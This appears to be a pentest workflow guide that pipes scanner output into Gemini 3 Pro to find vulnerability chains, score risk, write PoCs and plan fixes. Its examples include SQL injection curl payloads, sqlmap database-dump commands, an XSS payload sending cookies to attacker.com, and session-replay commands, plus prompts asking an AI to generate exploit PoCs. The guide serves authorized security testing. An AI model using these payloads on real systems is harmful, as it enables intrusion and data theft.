# Vulnerability Analysis with Gemini 3 Pro

## ⚠️ AUTHORIZATION NOTICE

**THIS WORKFLOW IS FOR AUTHORIZED SECURITY TESTING ONLY**

Legal use cases:
- Bug bounty programs (within scope)
- Authorized penetration testing engagements
- Security assessments on owned infrastructure
- Red team exercises with explicit permission

**Unauthorized use may violate:**
- Computer Fraud and Abuse Act (CFAA)
- State and local cybersecurity laws
- Terms of service agreements
- Professional ethics standards

**If you don't have written authorization, STOP NOW.**

## Overview

This workflow uses Google's Gemini 3 Pro model for deep vulnerability analysis and exploitation chain detection. Gemini 3 Pro's extended reasoning capabilities excel at correlating findings across multiple security tools to identify complex, multi-step attack paths.

## Why Gemini 3 Pro for Security Analysis?

**Unique Advantages:**
- **Deep Multi-Step Reasoning** - Traces complex vulnerability chains across multiple findings
- **Large Context Window** - Analyzes outputs from multiple tools simultaneously (2M tokens)
- **Pattern Recognition** - Identifies relationships between seemingly unrelated vulnerabilities
- **Mathematical Analysis** - Quantitative risk scoring with CVSS calculations
- **Chain Detection** - Connects individual findings into exploitable attack paths
- **Business Impact Analysis** - Assesses security findings in business context

**When to Use:**
- Analyzing scan outputs from multiple security tools
- Identifying complex vulnerability chains
- Prioritizing findings by exploitability and impact
- Generating proof-of-concept exploitation strategies
- Creating comprehensive security assessment reports

## Goals

1. **Correlation** - Connect findings across multiple tools (ffuf, nuclei, nikto, burp, nmap)
2. **Chain Detection** - Identify multi-step attack paths that compound severity
3. **Risk Scoring** - Calculate CVSS scores + exploitability + business impact
4. **PoC Generation** - Provide detailed exploitation steps for validated findings
5. **Remediation Planning** - Prioritized fixes with implementation guidance

## Workflow Phases

### Phase 1: Findings Collection

**Gather outputs from all security testing tools:**

```bash
# FFUF content discovery
ffuf -u https://target.com/FUZZ -w wordlist.txt -o ffuf-output.json

# Nuclei vulnerability scanning
nuclei -u https://target.com -o nuclei-output.json

# Nikto web server scanning
nikto -h https://target.com -o nikto-output.txt

# Nmap service detection
nmap -sV -sC -p- target.com -oX nmap-output.xml

# Burp Suite active scan (export as XML)
# Manual export from Burp Suite UI

# OWASP ZAP scanning
zap-cli quick-scan https://target.com -o zap-output.json
```

**Consolidate all outputs into a single directory:**

```bash
mkdir -p scan-results/target-com
cp ffuf-output.json scan-results/target-com/
cp nuclei-output.json scan-results/target-com/
cp nikto-output.txt scan-results/target-com/
cp nmap-output.xml scan-results/target-com/
cp burp-scan.xml scan-results/target-com/
cp zap-output.json scan-results/target-com/
```

### Phase 2: Data Normalization

**Parse scan outputs into structured markdown format:**

```bash
# Create consolidated findings document
cat > scan-results/target-com/consolidated-findings.md << 'EOF'
# Security Assessment Findings - target.com

## FFUF Content Discovery
[Paste parsed FFUF results - interesting directories, hidden files, exposed configs]

## Nuclei Vulnerability Scan
[Paste parsed Nuclei results - CVEs, misconfigurations, exposures]

## Nikto Web Server Scan
[Paste parsed Nikto results - server issues, outdated software, dangerous files]

## Nmap Service Detection
[Paste parsed Nmap results - open ports, service versions, OS detection]

## Burp Suite Active Scan
[Paste parsed Burp results - injection points, XSS, CSRF, etc.]

## OWASP ZAP Scan
[Paste parsed ZAP results - passive and active findings]

EOF
```

**Parsing Tips:**
- Focus on UNIQUE findings (deduplicate across tools)
- Include severity ratings from each tool
- Preserve context (URL, parameter, request/response snippets)
- Flag HIGH and CRITICAL findings for priority analysis

### Phase 3: Gemini 3 Pro Deep Analysis

**Run comprehensive vulnerability analysis:**

```bash
# Create analysis prompt
cat > analysis-prompt.md << 'EOF'
You are an expert penetration tester and security researcher analyzing web application security findings.

## Your Mission

Analyze the following security assessment findings and provide comprehensive vulnerability analysis with focus on:

1. **Vulnerability Chain Detection** - Identify multi-step attack paths where individual findings combine into higher-severity exploits
2. **Exploitability Assessment** - Rate each finding's practical exploitability (Proof-of-Concept exists? Weaponizable? Skill level required?)
3. **Business Impact Analysis** - Assess real-world impact on confidentiality, integrity, and availability
4. **Proof-of-Concept Strategies** - Provide detailed exploitation steps for validated high-severity findings
5. **Remediation Roadmap** - Prioritized fixes with implementation guidance

## Analysis Framework

For each finding and vulnerability chain:

### Risk Scoring
- **CVSS Base Score** (0-10 using CVSS 3.1)
- **Exploitability Score** (0-10 based on: PoC availability, attack complexity, privilege required, user interaction)
- **Business Impact Score** (0-10 based on: data sensitivity, user impact, regulatory implications)
- **Combined Risk Score** = (CVSS * 0.4) + (Exploitability * 0.3) + (Business Impact * 0.3)

### Vulnerability Chain Analysis
Look for combinations like:
- Directory traversal → Config file exposure → Credentials → Admin access
- XSS → Session hijacking → Admin impersonation → Data exfiltration
- SQL injection → Database dump → Password hashes → Lateral movement
- CORS misconfiguration → API access → Sensitive data exposure
- SSRF → Internal network access → Cloud metadata → AWS credentials
- File upload → Web shell → Remote code execution → Full system compromise

### Output Format
```markdown
# Vulnerability Analysis Report - [Target]

## Executive Summary
[3-5 sentences: Overall security posture, critical findings, recommended actions]

## Critical Findings (Combined Risk Score ≥ 8.0)

### Finding 1: [Vulnerability Name]
- **Type:** [Vulnerability class]
- **Location:** [URL/Endpoint/Parameter]
- **CVSS Score:** [X.X] ([Vector String])
- **Exploitability:** [X/10] - [Justification]
- **Business Impact:** [X/10] - [Justification]
- **Combined Risk:** [X.X/10]

**Description:**
[Detailed technical explanation]

**Exploitation Steps:**
1. [Step-by-step PoC]
2. [Include curl commands or scripts]
3. [Expected results]

**Remediation:**
- **Immediate:** [Quick mitigation]
- **Long-term:** [Proper fix]
- **Verification:** [How to test fix]

---

## Vulnerability Chains

### Chain 1: [Attack Path Name]
**Severity:** [Critical/High/Medium]
**Attack Path:** [Finding A] → [Finding B] → [Finding C] → [Impact]

**Combined Exploitation:**
[How individual findings link together]

**PoC Workflow:**
1. [Exploit Finding A to achieve X]
2. [Use X to exploit Finding B to achieve Y]
3. [Use Y to exploit Finding C to achieve Z]
4. [Final impact: Z]

**Remediation Priority:**
[Which findings must be fixed to break the chain]

---

## High Severity Findings (Risk Score 6.0-7.9)
[Same format as Critical]

## Medium Severity Findings (Risk Score 4.0-5.9)
[Condensed format]

## Low Severity Findings (Risk Score < 4.0)
[Brief listing]

## Remediation Roadmap

### Phase 1: Immediate (0-7 days)
1. [Critical finding fix]
2. [Critical finding fix]

### Phase 2: Short-term (1-4 weeks)
1. [High severity fix]
2. [High severity fix]

### Phase 3: Medium-term (1-3 months)
1. [Medium severity fix]
2. [Architecture improvements]

### Phase 4: Long-term (3-6 months)
1. [Security program improvements]
2. [Defense in depth]

## Testing Validation

For each critical/high finding:
- **Before Fix:** [How to verify vulnerability exists]
- **After Fix:** [How to verify fix is effective]
- **Regression Testing:** [How to ensure fix doesn't break functionality]
```

## Security Findings to Analyze

[PASTE CONSOLIDATED FINDINGS HERE]

EOF

# Run Gemini 3 Pro analysis
llm -m gemini-3-pro-preview "$(cat analysis-prompt.md)" \
  "$(cat scan-results/target-com/consolidated-findings.md)" \
  > scan-results/target-com/gemini-analysis-report.md
```

**Advanced Analysis Options:**

```bash
# Analysis with specific focus areas
llm -m gemini-3-pro-preview \
  "Focus on authentication and authorization vulnerabilities. \
   Look for privilege escalation paths and broken access control. \
   $(cat analysis-prompt.md)" \
  "$(cat scan-results/target-com/consolidated-findings.md)"

# Analysis with business context
llm -m gemini-3-pro-preview \
  "Business context: E-commerce platform processing credit cards (PCI-DSS scope). \
   Focus on payment security and customer data protection. \
   $(cat analysis-prompt.md)" \
  "$(cat scan-results/target-com/consolidated-findings.md)"

# Analysis for specific frameworks
llm -m gemini-3-pro-preview \
  "Technology stack: React frontend, Node.js/Express backend, MongoDB database. \
   Focus on NoSQL injection, JWT vulnerabilities, and CORS issues. \
   $(cat analysis-prompt.md)" \
  "$(cat scan-results/target-com/consolidated-findings.md)"
```

### Phase 4: Vulnerability Chain Detection

**Common Vulnerability Chains to Identify:**

**Authentication Bypass Chains:**
```
1. User enumeration → Username list → Password spraying → Valid credentials
2. IDOR on password reset → Reset token for admin → Account takeover
3. Session fixation → Victim authentication → Session hijacking
4. JWT algorithm confusion → Forged admin token → Full access
```

**Data Exfiltration Chains:**
```
1. XSS → Session cookie theft → Admin impersonation → Database access
2. SSRF → AWS metadata endpoint → IAM credentials → S3 bucket access
3. SQL injection → UNION-based data dump → Credential theft → Lateral movement
4. Path traversal → /etc/passwd → Username enum → Brute force SSH
```

**Remote Code Execution Chains:**
```
1. Unrestricted file upload → PHP web shell → www-data shell → Privilege escalation
2. Template injection → Server-side code execution → Reverse shell
3. Deserialization vulnerability → Object injection → Code execution
4. XXE → File read → SSH key theft → Server access
```

**Infrastructure Compromise Chains:**
```
1. Subdomain takeover → Phishing campaign → Credential harvest → Internal access
2. Open redirect → OAuth token theft → API access → Data exposure
3. CORS misconfiguration → Cross-origin API calls → Sensitive data theft
4. Exposed .git directory → Source code download → Hardcoded credentials → Database access
```

**Gemini 3 Pro Chain Analysis Command:**

```bash
llm -m gemini-3-pro-preview \
  "Identify all possible vulnerability chains in these findings. \
   For each chain: \
   1. List the individual vulnerabilities in sequence \
   2. Explain how each step enables the next \
   3. Calculate the combined CVSS score (use highest individual score + 1.0 for chain) \
   4. Provide step-by-step exploitation workflow \
   5. Identify the critical link to break the chain \

   $(cat scan-results/target-com/consolidated-findings.md)"
```

### Phase 5: Risk Scoring & Prioritization

**CVSS 3.1 Calculator Integration:**

```bash
# Install CVSS calculator
pip install cvss

# Calculate CVSS scores for findings
python3 << 'EOF'
import cvss
from cvss import CVSS3

# Example: SQL Injection vulnerability
vector = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
c = CVSS3(vector)

print(f"Base Score: {c.base_score}")
print(f"Temporal Score: {c.temporal_score}")
print(f"Environmental Score: {c.environmental_score}")
print(f"Severity: {c.severities()[0]}")  # CRITICAL, HIGH, MEDIUM, LOW
EOF
```

**Risk Matrix (for prioritization):**

| Combined Risk | Severity | Response Time | Remediation Priority |
|---------------|----------|---------------|---------------------|
| 9.0 - 10.0 | Critical | Immediate (0-24h) | P0 - Drop everything |
| 8.0 - 8.9 | Critical | Urgent (1-3 days) | P0 - This sprint |
| 7.0 - 7.9 | High | High (1 week) | P1 - Next sprint |
| 6.0 - 6.9 | High | Medium (2 weeks) | P1 - This quarter |
| 4.0 - 5.9 | Medium | Normal (1 month) | P2 - Backlog |
| 0.0 - 3.9 | Low | Low (3 months) | P3 - Nice to have |

**Prioritization Command:**

```bash
llm -m gemini-3-pro-preview \
  "Prioritize all findings using the risk matrix. \
   For each finding: \
   - Calculate combined risk score \
   - Assign severity level \
   - Determine response timeline \
   - Set remediation priority (P0-P3) \
   - Consider: CVSS score, exploitability, business impact, public PoC availability \

   Output as sortable CSV: \
   Vulnerability,Location,CVSS,Exploitability,Business Impact,Combined Risk,Severity,Priority,Response Time \

   $(cat scan-results/target-com/consolidated-findings.md)"
```

### Phase 6: Proof-of-Concept Generation

**PoC Requirements:**

For each CRITICAL and HIGH severity finding, generate:
1. **Detailed exploitation steps** (numbered, reproducible)
2. **Working code/commands** (curl, Python, Burp repeater)
3. **Expected results** (screenshots, output, logs)
4. **Impact demonstration** (what attacker can achieve)

**PoC Generation Command:**

```bash
llm -m gemini-3-pro-preview \
  "For each CRITICAL and HIGH severity finding, generate detailed proof-of-concept. \

   Requirements: \
   - Step-by-step exploitation instructions \
   - Working curl commands or Python scripts \
   - Expected output at each step \
   - Screenshots or log examples \
   - Impact demonstration \

   Format each PoC as: \
   ## [Vulnerability Name] - Proof of Concept \
   ### Setup \
   [Prerequisites, tools needed] \
   ### Exploitation Steps \
   1. [Step with command] \
   2. [Step with command] \
   ### Expected Results \
   [What you'll see] \
   ### Impact \
   [What attacker can do] \

   Findings: \
   $(cat scan-results/target-com/gemini-analysis-report.md | grep -A 20 'Critical Findings')"
```

**PoC Template:**

```bash
cat > poc-template.md << 'EOF'
# Proof of Concept: [Vulnerability Name]

## Vulnerability Details
- **Type:** [SQL Injection / XSS / SSRF / etc.]
- **Location:** [https://target.com/api/endpoint?param=]
- **Severity:** [Critical]
- **CVSS Score:** [9.8]

## Prerequisites
- Burp Suite Professional (or curl)
- Python 3.x with requests library
- sqlmap (for automated exploitation)

## Exploitation Steps

### Step 1: Identify Injection Point
```bash
# Test for SQL injection
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1--","password":"anything"}'
```

**Expected Result:**
```json
{"status":"success","token":"eyJhbGc...","user":"admin"}
```

### Step 2: Enumerate Database
```bash
# Use sqlmap for automated enumeration
sqlmap -u "https://target.com/api/login" \
  --data='{"username":"admin","password":"test"}' \
  --method=POST \
  --level=5 \
  --risk=3 \
  --dbs
```

**Expected Result:**
```
available databases [3]:
[*] information_schema
[*] mysql
[*] production_db
```

### Step 3: Extract Data
```bash
# Dump users table
sqlmap -u "https://target.com/api/login" \
  --data='{"username":"admin","password":"test"}' \
  -D production_db \
  -T users \
  --dump
```

**Expected Result:**
```
Database: production_db
Table: users
[5 entries]
+----+----------+----------------------------------+-------+
| id | username | password_hash                    | role  |
+----+----------+----------------------------------+-------+
| 1  | admin    | $2b$12$abcd1234...                | admin |
| 2  | john     | $2b$12$efgh5678...                | user  |
...
```

## Impact Demonstration

**Attacker Capabilities:**
1. ✅ Bypass authentication without credentials
2. ✅ Extract entire user database (5,000+ users)
3. ✅ Access password hashes (potential offline cracking)
4. ✅ Enumerate system users and roles
5. ✅ Potential for database modification (UPDATE/DELETE)

**Business Impact:**
- **Confidentiality:** Complete breach - all user data exposed
- **Integrity:** Database manipulation possible
- **Availability:** Potential for destructive SQL commands
- **Compliance:** GDPR violation (personal data breach)

## Remediation
[See main analysis report]

EOF
```

### Phase 7: Remediation Planning

**Generate prioritized remediation roadmap:**

```bash
llm -m gemini-3-pro-preview \
  "Create a detailed remediation roadmap based on these findings. \

   Structure as 4 phases: \
   1. Immediate (0-7 days) - Critical findings, emergency patches \
   2. Short-term (1-4 weeks) - High severity, architectural fixes \
   3. Medium-term (1-3 months) - Medium severity, defense in depth \
   4. Long-term (3-6 months) - Security program improvements \

   For each fix provide: \
   - Specific remediation steps \
   - Code examples or configuration changes \
   - Testing/validation procedures \
   - Estimated effort (hours/days) \
   - Dependencies and prerequisites \

   $(cat scan-results/target-com/gemini-analysis-report.md)"
```

## Integration with Existing Workflows

### Feeds From (Inputs)
- **reconnaissance.md** - Subdomain and asset discovery outputs
- **ffuf-guide.md** - Content discovery and fuzzing results
- **exploitation.md** - Vulnerability testing findings
- **osint/master-guide.md** - Intelligence gathering data

### Feeds Into (Outputs)
- **Penetration testing reports** - Executive summaries and technical details
- **Bug bounty submissions** - Detailed vulnerability reports with PoCs
- **Security roadmaps** - Prioritized remediation planning
- **Red team planning** - Attack path identification for exercises

### Tool Integration

**Compatible with:**
- ffuf (content discovery)
- nuclei (vulnerability scanning)
- nikto (web server testing)
- nmap (service detection)
- Burp Suite (comprehensive web app testing)
- OWASP ZAP (automated scanning)
- SQLMap (SQL injection testing)
- WPScan (WordPress security)

## Complete Example Workflow

**End-to-end vulnerability analysis for target.com:**

```bash
#!/bin/bash
# vulnerability-analysis.sh - Complete Gemini 3 Pro analysis workflow

TARGET="target.com"
OUTPUT_DIR="scan-results/${TARGET}"
mkdir -p "$OUTPUT_DIR"

echo "[*] Phase 1: Collecting findings..."

# Run security scans (requires authorization!)
ffuf -u "https://${TARGET}/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -mc 200,301,302,403 -o "${OUTPUT_DIR}/ffuf.json" -of json

nuclei -u "https://${TARGET}" -severity critical,high,medium \
  -o "${OUTPUT_DIR}/nuclei.txt"

nikto -h "https://${TARGET}" -o "${OUTPUT_DIR}/nikto.txt"

nmap -sV -sC -p- "${TARGET}" -oX "${OUTPUT_DIR}/nmap.xml"

echo "[*] Phase 2: Normalizing data..."

# Parse and consolidate findings
cat > "${OUTPUT_DIR}/consolidated.md" << EOF
# Security Findings - ${TARGET}

## FFUF Content Discovery
$(cat "${OUTPUT_DIR}/ffuf.json" | jq -r '.results[] | "- \(.status) \(.url) (\(.length) bytes)"')

## Nuclei Vulnerabilities
$(grep -v '^$' "${OUTPUT_DIR}/nuclei.txt")

## Nikto Web Server Issues
$(grep '^+' "${OUTPUT_DIR}/nikto.txt")

## Nmap Service Detection
$(grep 'open' "${OUTPUT_DIR}/nmap.xml" | sed 's/<[^>]*>//g')

EOF

echo "[*] Phase 3: Running Gemini 3 Pro analysis..."

# Deep vulnerability analysis
llm -m gemini-3-pro-preview \
  "Analyze these security findings. Identify vulnerability chains, calculate risk scores, generate PoCs for critical findings, and create a prioritized remediation roadmap. Use the comprehensive analysis framework from the vulnerability-analysis-gemini-3 workflow." \
  "$(cat ${OUTPUT_DIR}/consolidated.md)" \
  > "${OUTPUT_DIR}/analysis-report.md"

echo "[*] Phase 4: Extracting critical findings..."

# Extract critical findings for immediate action
llm -m gemini-3-pro-preview \
  "Extract ONLY critical findings (risk score >= 8.0) from this report. For each: vulnerability name, location, CVSS score, one-sentence impact, immediate remediation action." \
  "$(cat ${OUTPUT_DIR}/analysis-report.md)" \
  > "${OUTPUT_DIR}/critical-summary.md"

echo "[*] Phase 5: Generating PoCs..."

# Generate detailed PoCs for critical findings
llm -m gemini-3-pro-preview \
  "For each critical finding, generate a detailed proof-of-concept with: setup requirements, step-by-step exploitation, curl commands or scripts, expected results, impact demonstration." \
  "$(cat ${OUTPUT_DIR}/critical-summary.md)" \
  > "${OUTPUT_DIR}/pocs.md"

echo "[*] Phase 6: Creating remediation roadmap..."

# Prioritized remediation plan
llm -m gemini-3-pro-preview \
  "Create a 4-phase remediation roadmap: Immediate (0-7 days), Short-term (1-4 weeks), Medium-term (1-3 months), Long-term (3-6 months). For each fix: specific steps, code examples, validation procedure, estimated effort." \
  "$(cat ${OUTPUT_DIR}/analysis-report.md)" \
  > "${OUTPUT_DIR}/remediation-roadmap.md"

echo "[*] Analysis complete!"
echo "[*] Reports generated in: ${OUTPUT_DIR}/"
echo "    - analysis-report.md (full analysis)"
echo "    - critical-summary.md (executive summary)"
echo "    - pocs.md (proof-of-concepts)"
echo "    - remediation-roadmap.md (prioritized fixes)"
```

**Run the complete workflow:**

```bash
chmod +x vulnerability-analysis.sh
./vulnerability-analysis.sh
```

## Output Examples

### Example: Critical Finding

```markdown
### Finding 1: SQL Injection in Login Endpoint

- **Type:** SQL Injection (Boolean-based blind)
- **Location:** POST /api/v1/auth/login (username parameter)
- **CVSS Score:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Exploitability:** 9/10 - Public PoC available, sqlmap automates exploitation, no WAF detected
- **Business Impact:** 10/10 - Full database access, 50,000+ user records, PII exposure, GDPR violation
- **Combined Risk:** 9.6/10 - **CRITICAL**

**Description:**
The login endpoint is vulnerable to boolean-based blind SQL injection via the username parameter. The application constructs SQL queries using string concatenation without parameterization. Error-based and UNION-based injection are blocked by WAF, but boolean-based blind injection bypasses all defenses.

**Exploitation Steps:**

1. **Confirm SQL injection:**
```bash
curl -X POST https://target.com/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' AND 1=1--","password":"test"}'
# Response time: 250ms (normal)

curl -X POST https://target.com/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' AND 1=2--","password":"test"}'
# Response time: 150ms (different - confirms SQLi)
```

2. **Enumerate database with sqlmap:**
```bash
sqlmap -u "https://target.com/api/v1/auth/login" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  --dbms=mysql \
  --technique=B \
  --batch \
  --dbs
```

3. **Extract user table:**
```bash
sqlmap -u "https://target.com/api/v1/auth/login" \
  --data='{"username":"test","password":"test"}' \
  -D production \
  -T users \
  --dump
```

**Remediation:**

- **Immediate (0-24h):**
  - Deploy WAF rule to block SQL injection patterns
  - Enable request logging and monitoring
  - Add rate limiting to login endpoint (10 req/min per IP)

- **Long-term (1 week):**
  - Replace string concatenation with parameterized queries:
  ```javascript
  // BEFORE (vulnerable)
  const query = `SELECT * FROM users WHERE username = '${username}'`;

  // AFTER (secure)
  const query = 'SELECT * FROM users WHERE username = ?';
  db.execute(query, [username]);
  ```
  - Implement prepared statements throughout application
  - Add input validation and sanitization
  - Deploy database activity monitoring

- **Verification:**
  - Run sqlmap again - should fail
  - Test with various injection payloads - all should be blocked
  - Verify parameterized queries in code review
```

### Example: Vulnerability Chain

```markdown
## Vulnerability Chain: XSS → Session Hijacking → Admin Takeover

**Severity:** Critical
**Combined CVSS:** 9.2 (chain multiplier applied)
**Attack Path:** Reflected XSS → Cookie theft → Admin impersonation → Database access

### Individual Vulnerabilities

1. **Reflected XSS** (CVE-like: TARGET-2024-001)
   - Location: GET /search?q=[payload]
   - CVSS: 6.1 (Medium)
   - Impact alone: Defacement, phishing

2. **Missing HttpOnly Flag** (TARGET-2024-002)
   - Location: session_token cookie
   - CVSS: 4.3 (Medium)
   - Impact alone: Cookie theft via XSS

3. **No IP Binding on Sessions** (TARGET-2024-003)
   - Session valid from any IP address
   - CVSS: 5.3 (Medium)
   - Impact alone: Session replay attacks

### Combined Exploitation

**Attack Workflow:**

1. **Craft XSS payload to steal cookies:**
```html
https://target.com/search?q=<script>
fetch('https://attacker.com/steal?cookie='+document.cookie)
</script>
```

2. **Social engineering - send link to admin:**
```
"Check out these weird search results: [malicious link]"
```

3. **Capture admin session token:**
```
# Attacker's server receives:
session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

4. **Replay session from attacker's IP:**
```bash
curl https://target.com/admin/dashboard \
  -H "Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
# Success - admin dashboard access!
```

5. **Access sensitive admin functions:**
```bash
# Export all user data
curl https://target.com/admin/api/users/export \
  -H "Cookie: session_token=[stolen_token]" \
  -o all_users.csv
```

### Impact Analysis

**Combined Impact:**
- ✅ Full admin access without credentials
- ✅ Access to all user data (50,000+ records)
- ✅ Ability to modify system configuration
- ✅ Potential for persistent backdoor creation
- ✅ Complete application compromise

**Why This Chain is Critical:**
Individual findings are Medium severity, but chained together they enable full application takeover. The combination makes the attack:
- Easy to execute (low skill required)
- Hard to detect (looks like normal admin activity)
- High impact (complete compromise)

### Breaking the Chain

**Critical Link:** Missing HttpOnly flag
- Fixing ONLY the XSS allows other XSS vectors
- Fixing ONLY session binding allows cookie theft via MITM
- **Fixing HttpOnly flag breaks the entire chain** - even if XSS exists, cookies cannot be stolen

**Recommended Fix Priority:**
1. **P0 - Immediate:** Add HttpOnly and Secure flags to session cookies
2. **P1 - This week:** Fix reflected XSS vulnerability
3. **P2 - This sprint:** Implement session IP binding + user-agent validation
```

## Tools & Resources

### Required Tools
- **llm CLI** (Simon Willison) - Gemini 3 Pro interface
- **jq** - JSON parsing and processing
- **xmllint** - XML parsing for nmap/burp outputs
- **cvss** (Python) - CVSS score calculation

### Installation

```bash
# Install llm with Gemini plugin
pip install llm
llm install llm-gemini

# Configure Gemini API key
llm keys set gemini
# Paste your API key when prompted

# Verify Gemini 3 Pro access
llm models | grep gemini-3

# Install supporting tools
pip install cvss
brew install jq
```

### Security Tool Integration

```bash
# FFUF installation
go install github.com/ffuf/ffuf/v2@latest

# Nuclei installation
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update-templates

# Nikto installation
git clone https://github.com/sullo/nikto
cd nikto/program
chmod +x nikto.pl

# SQLMap installation
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
python3 sqlmap.py --wizard
```

## Best Practices

### Analysis Quality
1. ✅ **Include full context** - Paste complete scan outputs, not summaries
2. ✅ **Deduplicate findings** - Same vulnerability found by multiple tools = one finding
3. ✅ **Preserve evidence** - Include request/response snippets, URLs, parameters
4. ✅ **Business context** - Tell Gemini 3 about the application (e-commerce, healthcare, etc.)
5. ✅ **Validate chains** - Test that multi-step attacks actually work

### Gemini 3 Pro Optimization
1. ✅ **Use structured prompts** - Clear requirements and output format
2. ✅ **Leverage large context** - Feed all tools at once (don't split unnecessarily)
3. ✅ **Request explanations** - Ask "why" and "how" for deep analysis
4. ✅ **Iterate on findings** - Use follow-up prompts to drill deeper
5. ✅ **Combine with domain knowledge** - AI finds patterns, you validate exploitability

### Reporting Quality
1. ✅ **Executive summary first** - 3-5 sentences for decision makers
2. ✅ **Risk scores explained** - Show CVSS calculation and justification
3. ✅ **Actionable PoCs** - Step-by-step, copy-paste commands
4. ✅ **Remediation priority** - P0/P1/P2 with timelines
5. ✅ **Validation steps** - How to test both vulnerability and fix

## Common Pitfalls

### Analysis Mistakes
- ❌ Feeding too little context (Gemini 3 can handle 2M tokens - use it!)
- ❌ Not validating AI-generated findings (always test PoCs manually)
- ❌ Ignoring false positives (deduplicate and verify before reporting)
- ❌ Missing vulnerability chains (explicitly ask Gemini to find connections)
- ❌ Poor risk scoring (use CVSS calculator, don't guess)

### Reporting Mistakes
- ❌ No executive summary (decision makers won't read 50 pages)
- ❌ Missing remediation guidance (vulnerability without fix is useless)
- ❌ Unclear impact (explain business consequences, not just technical details)
- ❌ No proof-of-concept (unvalidated findings = low credibility)
- ❌ Wrong prioritization (critical CVSS but unexploitable ≠ critical priority)

## Reference

### Related Workflows
- Master Methodology: `~/.claude/skills/Webassessment/Workflows/pentest/MasterMethodology.md`
- Reconnaissance: `~/.claude/skills/Webassessment/Workflows/pentest/Reconnaissance.md`
- Exploitation: `~/.claude/skills/Webassessment/Workflows/pentest/Exploitation.md`
- FFUF Guide: `~/.claude/skills/Webassessment/Workflows/ffuf/FfufGuide.md`

### External Resources
- CVSS 3.1 Calculator: https://www.first.org/cvss/calculator/3.1
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackerOne Disclosure Guidelines: https://www.hackerone.com/disclosure-guidelines

### Further Reading
- "The Web Application Hacker's Handbook" (Stuttard & Pinto)
- "Bug Bounty Bootcamp" (Vickie Li)
- "Real-World Bug Hunting" (Peter Yaworski)
- Jason Haddix's "Bug Hunter's Methodology" (GitHub)
